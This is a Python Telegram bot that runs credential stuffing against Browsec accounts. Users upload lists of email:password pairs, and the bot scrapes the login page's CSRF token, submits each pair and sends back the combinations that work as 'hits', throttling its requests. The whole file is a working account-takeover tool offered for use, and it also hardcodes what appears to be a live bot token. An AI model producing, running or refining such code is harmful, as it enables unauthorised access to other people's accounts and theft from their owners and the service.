import telebot
import requests
from bs4 import BeautifulSoup
import time

TOKEN = '8072279299:AAH5u2FLs5jVEP_MjJ8uoAGI9bp0_cmabg8'  # Replace with your Telegram bot token
bot = telebot.TeleBot(TOKEN)

LOGIN_URL = 'https://browsec.com/en/login'

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send me a .txt file with email:password on each line to check Browsec accounts.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    file_info = bot.get_file(message.document.file_id)
    file = bot.download_file(file_info.file_path)
    content = file.decode('utf-8', errors='ignore')
    lines = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
    total = len(lines)
    if total == 0:
        bot.reply_to(message, "The file is empty or no valid email:password lines found.")
        return

    checked = 0
    hits = 0
    failures = 0

    # Send initial progress message
    progress_msg = bot.send_message(message.chat.id,
                                   f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}")

    session = requests.Session()

    for line in lines:
        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()

        # Get authenticity_token
        try:
            resp = session.get(LOGIN_URL, timeout=15)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find("input", {"name": "authenticity_token"})
            if not token_input:
                bot.edit_message_text("Failed to get authenticity_token from login page.",
                                      message.chat.id, progress_msg.message_id)
                return
            token = token_input.get("value")
        except Exception as e:
            bot.edit_message_text(f"Error fetching login page: {e}", message.chat.id, progress_msg.message_id)
            return

        payload = {
            "authenticity_token": token,
            "email": email,
            "user[password]": password
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": LOGIN_URL,
            "User-Agent": "Mozilla/5.0"
        }

        try:
            post_resp = session.post(LOGIN_URL, data=payload, headers=headers, timeout=15)
            text = post_resp.text
        except Exception:
            failures += 1
            checked += 1
            bot.edit_message_text(f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}",
                                  message.chat.id, progress_msg.message_id)
            continue

        if "Incorrect password/email" in text:
            failures += 1
        else:
            hits += 1
            # Send hit message immediately
            bot.send_message(message.chat.id,
                             f"browsec Hits\n\n{email}:{password}")

        checked += 1

        # Update progress message
        bot.edit_message_text(f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}",
                              message.chat.id, progress_msg.message_id)

        # Optional delay to avoid too fast requests
        time.sleep(1)

bot.polling()
